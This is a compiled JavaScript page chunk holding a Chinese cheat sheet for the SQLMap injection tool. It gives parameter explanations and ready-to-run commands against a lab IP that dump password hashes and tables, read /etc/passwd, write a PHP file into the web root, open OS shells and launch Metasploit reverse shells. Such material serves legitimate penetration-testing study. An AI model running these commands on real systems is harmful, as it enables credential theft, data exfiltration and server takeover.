(window.webpackJsonp=window.webpackJsonp||[]).push([[380],{678:function(s,t,a){"use strict";a.r(t);var n=a(7),e=Object(n.a)({},(function(){var s=this,t=s._self._c;return t("ContentSlotsDistributor",{attrs:{"slot-key":s.$parent.slotKey}},[t("h1",{attrs:{id:"sqlmap用法总结"}},[t("a",{staticClass:"header-anchor",attrs:{href:"#sqlmap用法总结"}},[s._v("#")]),s._v(" SQLMap用法总结")]),s._v(" "),t("h2",{attrs:{id:"参数说明"}},[t("a",{staticClass:"header-anchor",attrs:{href:"#参数说明"}},[s._v("#")]),s._v(" 参数说明")]),s._v(" "),t("div",{staticClass:"language- line-numbers-mode"},[t("pre",{pre:!0,attrs:{class:"language-text"}},[t("code",[s._v('-u #注入点\n-f #指纹判别数据库类型\n-b #获取数据库版本信息\n-p #指定可测试的参数(?page=1&id=2 -p "page,id")\n-D "" #指定数据库名\n-T "" #指定表名\n-C "" #指定字段\n-s "" #保存注入过程到一个文件,还可中断，下次恢复在注入(保存：-s "xx.log" 恢复:-s "xx.log" –resume)\n–columns #列出字段\n–current-user #获取当前用户名称\n–current-db #获取当前数据库名称\n–users #列数据库所有用户\n–passwords #数据库用户所有密码\n–privileges #查看用户权限(–privileges -U root)\n-U #指定数据库用户\n–dbs #列出所有数据库\n–tables -D "" #列出指定数据库中的表\n–columns -T "user" -D "mysql" #列出mysql数据库中的user表的所有字段\n–dump-all #列出所有数据库所有表\n–exclude-sysdbs #只列出用户自己新建的数据库和表\n–dump -T "" -D "" -C "" #列出指定数据库的表的字段的数据(–dump -T users -D master -C surname)\n–dump -T "" -D "" –start 2 –top 4 # 列出指定数据库的表的2-4字段的数据\n–dbms #指定数据库(MySQL,Oracle,PostgreSQL,Microsoft SQL Server,Microsoft Access,SQLite,Firebird,Sybase,SAP MaxDB)\n–os #指定系统(Linux,Windows)\n-v #详细的等级(0-6)\n0：只显示Python的回溯，错误和关键消息。\n1：显示信息和警告消息。\n2：显示调试消息。\n3：有效载荷注入。\n4：显示HTTP请求。\n5：显示HTTP响应头。\n6：显示HTTP响应页面的内容\n–privileges #查看权限\n–is-dba #是否是数据库管理员\n–roles #枚举数据库用户角色\n–udf-inject #导入用户自定义函数（获取系统权限）\n–union-check #是否支持union 注入\n–union-cols #union 查询表记录\n–union-test #union 语句测试\n–union-use #采用union 注入\n–union-tech orderby #union配合order by\n–method "POST" –data "" #POST方式提交数据(–method "POST" –data "page=1&id=2″)\n–cookie "用;号分开" #cookie注入(–cookies="PHPSESSID=mvijocbglq6pi463rlgk1e4v52; security=low")\n–referer "" #使用referer欺骗(–referer "http://www.baidu.com")\n–user-agent "" #自定义user-agent\n–proxy "http://127.0.0.1:8118″ #代理注入\n–string "" #指定关键词\n–threads #采用多线程(–threads 3)\n–sql-shell #执行指定sql命令\n–sql-query #执行指定的sql语句(–sql-query "SELECT password FROM mysql.user WHERE user = ‘root’ LIMIT 0, 1″ )\n–file-read #读取指定文件\n–file-write #写入本地文件(–file-write /test/test.txt –file-dest /var/www/html/1.txt;将本地的test.txt文件写入到目标的1.txt)\n–file-dest #要写入的文件绝对路径\n–os-cmd=id #执行系统命令\n–os-shell #系统交互shell\n–os-pwn #反弹shell(–os-pwn –msf-path=/opt/framework/msf3/)\n–msf-path= #matesploit绝对路径(–msf-path=/opt/framework/msf3/)\n–os-smbrelay #\n–os-bof #\n–reg-read #读取win系统注册表\n–priv-esc #\n–time-sec= #延迟设置 默认–time-sec=5 为5秒\n-p "user-agent" –user-agent "sqlmap/0.7rc1 (http://sqlmap.sourceforge.net)" #指定user-agent注入\n–eta #盲注\n')])]),s._v(" "),t("div",{staticClass:"line-numbers-wrapper"},[t("span",{staticClass:"line-number"},[s._v("1")]),t("br"),t("span",{staticClass:"line-number"},[s._v("2")]),t("br"),t("span",{staticClass:"line-number"},[s._v("3")]),t("br"),t("span",{staticClass:"line-number"},[s._v("4")]),t("br"),t("span",{staticClass:"line-number"},[s._v("5")]),t("br"),t("span",{staticClass:"line-number"},[s._v("6")]),t("br"),t("span",{staticClass:"line-number"},[s._v("7")]),t("br"),t("span",{staticClass:"line-number"},[s._v("8")]),t("br"),t("span",{staticClass:"line-number"},[s._v("9")]),t("br"),t("span",{staticClass:"line-number"},[s._v("10")]),t("br"),t("span",{staticClass:"line-number"},[s._v("11")]),t("br"),t("span",{staticClass:"line-number"},[s._v("12")]),t("br"),t("span",{staticClass:"line-number"},[s._v("13")]),t("br"),t("span",{staticClass:"line-number"},[s._v("14")]),t("br"),t("span",{staticClass:"line-number"},[s._v("15")]),t("br"),t("span",{staticClass:"line-number"},[s._v("16")]),t("br"),t("span",{staticClass:"line-number"},[s._v("17")]),t("br"),t("span",{staticClass:"line-number"},[s._v("18")]),t("br"),t("span",{staticClass:"line-number"},[s._v("19")]),t("br"),t("span",{staticClass:"line-number"},[s._v("20")]),t("br"),t("span",{staticClass:"line-number"},[s._v("21")]),t("br"),t("span",{staticClass:"line-number"},[s._v("22")]),t("br"),t("span",{staticClass:"line-number"},[s._v("23")]),t("br"),t("span",{staticClass:"line-number"},[s._v("24")]),t("br"),t("span",{staticClass:"line-number"},[s._v("25")]),t("br"),t("span",{staticClass:"line-number"},[s._v("26")]),t("br"),t("span",{staticClass:"line-number"},[s._v("27")]),t("br"),t("span",{staticClass:"line-number"},[s._v("28")]),t("br"),t("span",{staticClass:"line-number"},[s._v("29")]),t("br"),t("span",{staticClass:"line-number"},[s._v("30")]),t("br"),t("span",{staticClass:"line-number"},[s._v("31")]),t("br"),t("span",{staticClass:"line-number"},[s._v("32")]),t("br"),t("span",{staticClass:"line-number"},[s._v("33")]),t("br"),t("span",{staticClass:"line-number"},[s._v("34")]),t("br"),t("span",{staticClass:"line-number"},[s._v("35")]),t("br"),t("span",{staticClass:"line-number"},[s._v("36")]),t("br"),t("span",{staticClass:"line-number"},[s._v("37")]),t("br"),t("span",{staticClass:"line-number"},[s._v("38")]),t("br"),t("span",{staticClass:"line-number"},[s._v("39")]),t("br"),t("span",{staticClass:"line-number"},[s._v("40")]),t("br"),t("span",{staticClass:"line-number"},[s._v("41")]),t("br"),t("span",{staticClass:"line-number"},[s._v("42")]),t("br"),t("span",{staticClass:"line-number"},[s._v("43")]),t("br"),t("span",{staticClass:"line-number"},[s._v("44")]),t("br"),t("span",{staticClass:"line-number"},[s._v("45")]),t("br"),t("span",{staticClass:"line-number"},[s._v("46")]),t("br"),t("span",{staticClass:"line-number"},[s._v("47")]),t("br"),t("span",{staticClass:"line-number"},[s._v("48")]),t("br"),t("span",{staticClass:"line-number"},[s._v("49")]),t("br"),t("span",{staticClass:"line-number"},[s._v("50")]),t("br"),t("span",{staticClass:"line-number"},[s._v("51")]),t("br"),t("span",{staticClass:"line-number"},[s._v("52")]),t("br"),t("span",{staticClass:"line-number"},[s._v("53")]),t("br"),t("span",{staticClass:"line-number"},[s._v("54")]),t("br"),t("span",{staticClass:"line-number"},[s._v("55")]),t("br"),t("span",{staticClass:"line-number"},[s._v("56")]),t("br"),t("span",{staticClass:"line-number"},[s._v("57")]),t("br"),t("span",{staticClass:"line-number"},[s._v("58")]),t("br"),t("span",{staticClass:"line-number"},[s._v("59")]),t("br"),t("span",{staticClass:"line-number"},[s._v("60")]),t("br"),t("span",{staticClass:"line-number"},[s._v("61")]),t("br"),t("span",{staticClass:"line-number"},[s._v("62")]),t("br"),t("span",{staticClass:"line-number"},[s._v("63")]),t("br"),t("span",{staticClass:"line-number"},[s._v("64")]),t("br")])]),t("p",[s._v("/pentest/database/sqlmap/txt/ common-columns.txt 字段字典 common-outputs.txt common-tables.txt 表字典 keywords.txt oracle-default-passwords.txt user-agents.txt wordlist.txt")]),s._v(" "),t("h2",{attrs:{id:"常用语句"}},[t("a",{staticClass:"header-anchor",attrs:{href:"#常用语句"}},[s._v("#")]),s._v(" 常用语句")]),s._v(" "),t("div",{staticClass:"language- line-numbers-mode"},[t("pre",{pre:!0,attrs:{class:"language-text"}},[t("code",[s._v('1.\n./sqlmap.py -u http://192.168.109.139/test.php?p=2 -f -b –current-user –current-db –users –passwords –dbs -v 0\n2.\n./sqlmap.py -u http://192.168.109.139/test.php?p=2 -b –passwords -U root –union-use -v 2\n3.\n./sqlmap.py -u http://192.168.109.139/test.php?p=2 -b –dump -T users -C username -D userdb –start 2 –stop 3 -v 2\n4.\n./sqlmap.py -u http://192.168.109.139/test.php?p=2 -b –dump -C "user,pass" -v 1 –exclude-sysdbs\n5.\n./sqlmap.py -u http://192.168.109.139/test.php?p=2 -b –sql-shell -v 2\n6.\n./sqlmap.py -u http://192.168.109.139/test.php?p=2 -b –file-read "c:\\boot.ini" -v 2\n7.\n./sqlmap.py -u http://192.168.109.139/test.php?p=2 -b –file-write /test/test.txt –file-dest /var/www/html/1.txt -v 2\n8.\n./sqlmap.py -u http://192.168.109.139/test.php?p=2 -b –os-cmd "id" -v 1\n9.\n./sqlmap.py -u http://192.168.109.139/test.php?p=2 -b –os-shell –union-use -v 2\n10.\n./sqlmap.py -u http://192.168.109.139/test.php?p=2 -b –os-pwn –msf-path=/opt/framework/msf3 –priv-esc -v 1\n11.\n./sqlmap.py -u http://192.168.109.139/test.php?p=2 -b –os-pwn –msf-path=/opt/framework/msf3 -v 1\n12.\n./sqlmap.py -u http://192.168.109.139/test.php?p=2 -b –os-bof –msf-path=/opt/framework/msf3 -v 1\n13.\n./sqlmap.py -u http://192.168.109.139/test.php?p=2 –reg-add –reg-key="HKEY_LOCAL_NACHINE\\SOFEWARE\\sqlmap" –reg-value=Test –reg-type=REG_SZ –reg-data=1\n14.\n./sqlmap.py -u http://192.168.109.139/test.php?p=2 -b –eta\n15.\n./sqlmap.py -u "http://192.168.109.139/sqlmap/mysql/get_str_brackets.php?id=1″ -p id –prefix "‘)" –suffix "AND (‘abc’=’abc"\n16.\n./sqlmap.py -u "http://192.168.109.139/sqlmap/mysql/basic/get_int.php?id=1″ –auth-type Basic –auth-cred "testuser:testpass"\n17.\n./sqlmap.py -l burp.log –scope="(www)?\\.target\\.(com|net|org)"\n18.\n./sqlmap.py -u "http://192.168.109.139/sqlmap/mysql/get_int.php?id=1″ –tamper tamper/between.py,tamper/randomcase.py,tamper/space2comment.py -v 3\n19.\n./sqlmap.py -u "http://192.168.109.139/sqlmap/mssql/get_int.php?id=1″ –sql-query "SELECT ‘foo\'" -v 1\n20.\n./sqlmap.py -u "http://192.168.109.139/mysql/get_int_4.php?id=1″ –common-tables -D testdb –banner\n')])]),s._v(" "),t("div",{staticClass:"line-numbers-wrapper"},[t("span",{staticClass:"line-number"},[s._v("1")]),t("br"),t("span",{staticClass:"line-number"},[s._v("2")]),t("br"),t("span",{staticClass:"line-number"},[s._v("3")]),t("br"),t("span",{staticClass:"line-number"},[s._v("4")]),t("br"),t("span",{staticClass:"line-number"},[s._v("5")]),t("br"),t("span",{staticClass:"line-number"},[s._v("6")]),t("br"),t("span",{staticClass:"line-number"},[s._v("7")]),t("br"),t("span",{staticClass:"line-number"},[s._v("8")]),t("br"),t("span",{staticClass:"line-number"},[s._v("9")]),t("br"),t("span",{staticClass:"line-number"},[s._v("10")]),t("br"),t("span",{staticClass:"line-number"},[s._v("11")]),t("br"),t("span",{staticClass:"line-number"},[s._v("12")]),t("br"),t("span",{staticClass:"line-number"},[s._v("13")]),t("br"),t("span",{staticClass:"line-number"},[s._v("14")]),t("br"),t("span",{staticClass:"line-number"},[s._v("15")]),t("br"),t("span",{staticClass:"line-number"},[s._v("16")]),t("br"),t("span",{staticClass:"line-number"},[s._v("17")]),t("br"),t("span",{staticClass:"line-number"},[s._v("18")]),t("br"),t("span",{staticClass:"line-number"},[s._v("19")]),t("br"),t("span",{staticClass:"line-number"},[s._v("20")]),t("br"),t("span",{staticClass:"line-number"},[s._v("21")]),t("br"),t("span",{staticClass:"line-number"},[s._v("22")]),t("br"),t("span",{staticClass:"line-number"},[s._v("23")]),t("br"),t("span",{staticClass:"line-number"},[s._v("24")]),t("br"),t("span",{staticClass:"line-number"},[s._v("25")]),t("br"),t("span",{staticClass:"line-number"},[s._v("26")]),t("br"),t("span",{staticClass:"line-number"},[s._v("27")]),t("br"),t("span",{staticClass:"line-number"},[s._v("28")]),t("br"),t("span",{staticClass:"line-number"},[s._v("29")]),t("br"),t("span",{staticClass:"line-number"},[s._v("30")]),t("br"),t("span",{staticClass:"line-number"},[s._v("31")]),t("br"),t("span",{staticClass:"line-number"},[s._v("32")]),t("br"),t("span",{staticClass:"line-number"},[s._v("33")]),t("br"),t("span",{staticClass:"line-number"},[s._v("34")]),t("br"),t("span",{staticClass:"line-number"},[s._v("35")]),t("br"),t("span",{staticClass:"line-number"},[s._v("36")]),t("br"),t("span",{staticClass:"line-number"},[s._v("37")]),t("br"),t("span",{staticClass:"line-number"},[s._v("38")]),t("br"),t("span",{staticClass:"line-number"},[s._v("39")]),t("br"),t("span",{staticClass:"line-number"},[s._v("40")]),t("br")])]),t("h2",{attrs:{id:"简单的注入流程"}},[t("a",{staticClass:"header-anchor",attrs:{href:"#简单的注入流程"}},[s._v("#")]),s._v(" 简单的注入流程")]),s._v(" "),t("p",[t("strong",[s._v("1.读取数据库版本，当前用户，当前数据库")])]),s._v(" "),t("div",{staticClass:"language- line-numbers-mode"},[t("pre",{pre:!0,attrs:{class:"language-text"}},[t("code",[s._v("sqlmap -u http://192.168.109.139/test.php?p=2 -f -b –current-user –current-db -v 1\n")])]),s._v(" "),t("div",{staticClass:"line-numbers-wrapper"},[t("span",{staticClass:"line-number"},[s._v("1")]),t("br")])]),t("p",[t("strong",[s._v("2.判断当前数据库用户权限")])]),s._v(" "),t("div",{staticClass:"language- line-numbers-mode"},[t("pre",{pre:!0,attrs:{class:"language-text"}},[t("code",[s._v("sqlmap -u http://192.168.109.139/test.php?p=2 –privileges -U 用户名 -v 1\nsqlmap -u http://192.168.109.139/test.php?p=2 –is-dba -U 用户名 -v 1\n")])]),s._v(" "),t("div",{staticClass:"line-numbers-wrapper"},[t("span",{staticClass:"line-number"},[s._v("1")]),t("br"),t("span",{staticClass:"line-number"},[s._v("2")]),t("br")])]),t("p",[t("strong",[s._v("3.读取所有数据库用户或指定数据库用户的密码")])]),s._v(" "),t("div",{staticClass:"language- line-numbers-mode"},[t("pre",{pre:!0,attrs:{class:"language-text"}},[t("code",[s._v("sqlmap -u http://192.168.109.139/test.php?p=2 –users –passwords -v 2\nsqlmap -u http://192.168.109.139/test.php?p=2 –passwords -U root -v 2\n")])]),s._v(" "),t("div",{staticClass:"line-numbers-wrapper"},[t("span",{staticClass:"line-number"},[s._v("1")]),t("br"),t("span",{staticClass:"line-number"},[s._v("2")]),t("br")])]),t("p",[t("strong",[s._v("4.获取所有数据库")])]),s._v(" "),t("div",{staticClass:"language- line-numbers-mode"},[t("pre",{pre:!0,attrs:{class:"language-text"}},[t("code",[s._v("sqlmap -u http://192.168.109.139/test.php?p=2 –dbs -v 2\n")])]),s._v(" "),t("div",{staticClass:"line-numbers-wrapper"},[t("span",{staticClass:"line-number"},[s._v("1")]),t("br")])]),t("p",[t("strong",[s._v("5.获取指定数据库中的所有表")])]),s._v(" "),t("div",{staticClass:"language- line-numbers-mode"},[t("pre",{pre:!0,attrs:{class:"language-text"}},[t("code",[s._v("sqlmap -u http://192.168.109.139/test.php?p=2 –tables -D mysql -v 2\n")])]),s._v(" "),t("div",{staticClass:"line-numbers-wrapper"},[t("span",{staticClass:"line-number"},[s._v("1")]),t("br")])]),t("p",[t("strong",[s._v("6.获取指定数据库名中指定表的字段")])]),s._v(" "),t("div",{staticClass:"language- line-numbers-mode"},[t("pre",{pre:!0,attrs:{class:"language-text"}},[t("code",[s._v("sqlmap -u http://192.168.109.139/test.php?p=2 –columns -D mysql -T users -v 2\n")])]),s._v(" "),t("div",{staticClass:"line-numbers-wrapper"},[t("span",{staticClass:"line-number"},[s._v("1")]),t("br")])]),t("p",[t("strong",[s._v("7.获取指定数据库名中指定表中指定字段的数据")])]),s._v(" "),t("div",{staticClass:"language- line-numbers-mode"},[t("pre",{pre:!0,attrs:{class:"language-text"}},[t("code",[s._v('sqlmap -u http://192.168.109.139/test.php?p=2 –dump -D mysql -T users -C "username,password" -s "sqlnmapdb.log" -v 2\n')])]),s._v(" "),t("div",{staticClass:"line-numbers-wrapper"},[t("span",{staticClass:"line-number"},[s._v("1")]),t("br")])]),t("p",[t("strong",[s._v("8.file-read读取web文件")])]),s._v(" "),t("div",{staticClass:"language- line-numbers-mode"},[t("pre",{pre:!0,attrs:{class:"language-text"}},[t("code",[s._v('sqlmap -u http://192.168.109.139/test.php?p=2 –file-read "/etc/passwd" -v 2\n')])]),s._v(" "),t("div",{staticClass:"line-numbers-wrapper"},[t("span",{staticClass:"line-number"},[s._v("1")]),t("br")])]),t("p",[t("strong",[s._v("9.file-write写入文件到web")])]),s._v(" "),t("div",{staticClass:"language- line-numbers-mode"},[t("pre",{pre:!0,attrs:{class:"language-text"}},[t("code",[s._v("sqlmap -u http://192.168.109.139/test.php?p=2 –file-write /localhost/mm.php –file-dest /var/www/html/xx.php -v 2\n")])]),s._v(" "),t("div",{staticClass:"line-numbers-wrapper"},[t("span",{staticClass:"line-number"},[s._v("1")]),t("br")])]),t("h2",{attrs:{id:"写在最后"}},[t("a",{staticClass:"header-anchor",attrs:{href:"#写在最后"}},[s._v("#")]),s._v(" 写在最后")]),s._v(" "),t("blockquote",[t("p",[s._v("如果你觉得冰河写的还不错，请微信搜索并关注「 "),t("strong",[s._v("冰河技术")]),s._v(" 」微信公众号，跟冰河学习高并发、分布式、微服务、大数据、互联网和云原生技术，「 "),t("strong",[s._v("冰河技术")]),s._v(" 」微信公众号更新了大量技术专题，每一篇技术文章干货满满！不少读者已经通过阅读「 "),t("strong",[s._v("冰河技术")]),s._v(" 」微信公众号文章，吊打面试官，成功跳槽到大厂；也有不少读者实现了技术上的飞跃，成为公司的技术骨干！如果你也想像他们一样提升自己的能力，实现技术能力的飞跃，进大厂，升职加薪，那就关注「 "),t("strong",[s._v("冰河技术")]),s._v(" 」微信公众号吧，每天更新超硬核技术干货，让你对如何提升技术能力不再迷茫！")])]),s._v(" "),t("p",[t("img",{staticClass:"lazy",attrs:{alt:"","data-src":"https://img-blog.csdnimg.cn/20200906013715889.png",loading:"lazy"}})])])}),[],!1,null,null,null);t.default=e.exports}}]);